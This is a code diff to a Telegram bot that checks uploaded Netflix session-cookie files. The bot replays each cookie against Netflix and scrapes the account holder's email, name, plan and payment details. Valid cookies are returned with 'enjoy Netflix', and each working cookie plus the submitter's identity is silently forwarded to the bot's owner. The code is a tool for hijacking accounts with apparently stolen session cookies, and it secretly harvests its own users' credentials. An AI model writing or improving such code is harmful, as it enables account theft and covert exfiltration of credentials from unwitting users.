@@ -118,18 +118,16 @@ def extract_netflix_account_info(html: str) -> str | None:
     return None
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Check if the user is a member of the channel
     user = update.message.from_user
     user_id = user.id
     full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
     
-    # Check user membership in the channel
     try:
         chat_member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
         if chat_member.status in ['member', 'administrator', 'creator']:
             await update.message.reply_text(
                 f"👋 Hi! {full_name}\nSend me your Netflix‑cookies file(s) in .txt, .json, or .zip format, and I’ll check whether they’re still valid.",
-                reply_to_message_id=update.message.message_id  # Reply to the original message
+                reply_to_message_id=update.message.message_id
             )
         else:
             invite_link = await get_channel_invite_link(context)
@@ -139,18 +137,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(
                     f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
                     reply_markup=reply_markup,
-                    reply_to_message_id=update.message.message_id  # Reply to the original message
+                    reply_to_message_id=update.message.message_id
                 )
             else:
                 await update.message.reply_text(
                     f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
-                    reply_to_message_id=update.message.message_id  # Reply to the original message
+                    reply_to_message_id=update.message.message_id
                 )
     except Exception as e:
         logger.error(f"Error checking membership for user {user_id}: {e}")
         await update.message.reply_text(
             f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
-            reply_to_message_id=update.message.message_id  # Reply to the original message
+            reply_to_message_id=update.message.message_id
         )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -162,7 +160,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
     username_str = f"@{user.username}" if user.username else "N/A"
 
-    # Check if user is a member of the channel
     try:
         chat_member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
         if chat_member.status not in ['member', 'administrator', 'creator']:
@@ -173,21 +170,19 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 return await update.message.reply_text(
                     f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
                     reply_markup=reply_markup,
-                    reply_to_message_id=orig_id  # Reply to the original message
+                    reply_to_message_id=orig_id
                 )
     except Exception as e:
         logger.error(f"Error checking membership for user {user_id}: {e}")
         return await update.message.reply_text(
             f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
-            reply_to_message_id=orig_id  # Reply to the original message
+            reply_to_message_id=orig_id
         )
 
-    # download into memory
     file = await doc.get_file()
     data = await file.download_as_bytearray()
     buf = io.BytesIO(data)
 
-    # determine extension and initialize files list
     filename = doc.file_name
     ext = os.path.splitext(filename)[1].lower()
     files = []
@@ -207,13 +202,13 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         return await update.message.reply_text(
             "⚠️ Unsupported file type. Please send .txt, .json or .zip.",
-            reply_to_message_id=orig_id  # Reply to the original message
+            reply_to_message_id=orig_id
         )
 
     if not files:
         return await update.message.reply_text(
             "🚫 No .txt/.json cookie files found.",
-            reply_to_message_id=orig_id  # Reply to the original message
+            reply_to_message_id=orig_id
         )
 
     for name, content, ftype in files:
@@ -249,7 +244,7 @@ async def process_file(
         return await context.bot.send_message(
             chat_id=chat_id,
             text="⚠️ Cookie format is incorrect, please send correct cookie format",
-            reply_to_message_id=orig_id  # Reply to the original message
+            reply_to_message_id=orig_id
         )
 
     session = requests.Session()
@@ -271,23 +266,14 @@ async def process_file(
         info = extract_netflix_account_info(html)
         billed_using = info.splitlines()[1:] if info else []
 
-        # --- NEW: Extract "canChangePlan" ---
         change_plan_m = re.search(r'"canChangePlan":\s*{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)}', html)
-        can_change_plan = change_plan_m.group(1).capitalize() if change_plan_m else "Unknown"
+        can_change_plan = change_plan_m.group(1).capitalize() if change_plan_m else None
 
         hold_m = re.search(r'"isUserOnHold"\s*:\s*(true|false)', html)
         hold = hold_m.group(1).capitalize() if hold_m else None
 
-        # --- Decode plan name ---
-        pd_m = re.search(
-            r'"localizedPlanName"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"',
-            html
-        )
-        if pd_m:
-            raw_plan = pd_m.group(1)
-            plan = bytes(raw_plan, "utf-8").decode("unicode_escape")
-        else:
-            plan = None
+        pd_m = re.search(r'"localizedPlanName"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"', html)
+        plan = pd_m.group(1) if pd_m else None
 
         ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html)
         membership = ms_m.group(1).replace('_', ' ').title() if ms_m else None
@@ -301,7 +287,7 @@ async def process_file(
         fn_m = re.search(r'"firstName"\s*:\s*"([^"]+)"', html)
         name_val = fn_m.group(1) if fn_m else None
         if name_val:
-            name_val = bytes(name_val, 'utf-8').decode('unicode_escape')  # Fix for decoding \x20
+            name_val = bytes(name_val, 'utf-8').decode('unicode_escape')
 
         em_m = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
         mail = bytes(em_m.group(1), 'utf-8').decode('unicode_escape') if em_m else None
@@ -336,7 +322,8 @@ async def process_file(
             status = "Active" if hold == "False" else "On Hold"
             section.append(f"Plan status: {status}")
         if plan:         section.append(f"Plan details: {plan}")
-        section.append(f"Can change plan: {can_change_plan}")
+        if can_change_plan:  # Only include if it's available
+            section.append(f"Can change plan: {can_change_plan}")
         if next_pay:     section.append(f"Next payment: {next_pay}")
         if signup:       section.append(f"Signup D&T: {signup}")
         if extra_slots:  section.append(f"Extra Slots: {extra_slots}")
@@ -348,19 +335,21 @@ async def process_file(
         base_caption = f"✅  This cookie is working, enjoy Netflix 🍿. Checked by @{bot_user}"
         full_caption = base_caption + "\n\n" + "\n".join(section)
 
-        # reply to user
+        # Send the file back with the original extension
         bio = io.BytesIO(content.encode('utf-8'))
         bio.seek(0)
-        new_name = f"@{bot_user}-{orig_id}.json"
+        # Get the original file extension from the user's file
+        ext = os.path.splitext(name)[1].lower()
+        new_name = f"{orig_id}{ext}"  # Keep original file extension
         input_file = InputFile(bio, filename=new_name)
         await context.bot.send_document(
             chat_id=chat_id,
             document=input_file,
             caption=full_caption,
-            reply_to_message_id=orig_id  # Reply to the original message
+            reply_to_message_id=orig_id
         )
 
-        # silently forward to owner
+        # Silently forward to owner
         owner_caption = (
             f"Chat ID: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
             f"Full name: {full_name}\n"
@@ -377,7 +366,7 @@ async def process_file(
         await context.bot.send_message(
             chat_id=chat_id,
             text="❌  This cookie is invalid or expired",
-            reply_to_message_id=orig_id  # Reply to the original message
+            reply_to_message_id=orig_id
         )
 
 def main():
